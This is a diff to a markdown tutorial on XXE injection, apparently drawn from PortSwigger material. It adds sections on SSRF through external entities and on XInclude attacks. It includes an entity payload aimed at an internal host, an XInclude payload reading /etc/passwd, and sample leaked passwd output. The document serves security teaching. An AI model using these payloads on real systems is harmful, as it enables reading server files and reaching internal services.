@@ -32,7 +32,7 @@ Like XXE are a type of custom XML entity whose defined values are loaded from ou
 
 
 ## How to find and test XXE
-1. Exploiting XXE to retrieve files
+### 1. Exploiting XXE to retrieve files
 
  To perform an XXE injection attack that retrieves an arbitrary file from the server's filesystem, you need to modify the submitted XML in two ways:
 
@@ -57,6 +57,29 @@ Invalid product ID: root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 ```
+### 2. Exploiting XXE to perform SSRF attacks
+
+SSRF is a potentially serious vulnerability in which the server-side application can be induced to make HTTP requests to any URL that the server can access.
+
+Example: Perform SSRF attack, you need to define an external XML entity using the URL that you want to target, and use the defined entity within a data value
+```
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+```
+### 3. [Blind XXE vulnerabilities](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band)
+
+### 4. Finding hidden attack surface for XXE injection
+  1. XInclude attacks
+
+Perform an XInclude attack, you need to reference the `XInclude` namespace and provide the path to the file that you wish to include. 
+
+Example:
+```
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+<xi:include parse="text" href="file:///etc/passwd"/></foo> 
+```
+  2. [XXE attacks via file upload](https://portswigger.net/web-security/xxe)
+  3. [XXE attacks via modified content type](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks)
+
 
 ## Remediation of XXE
 
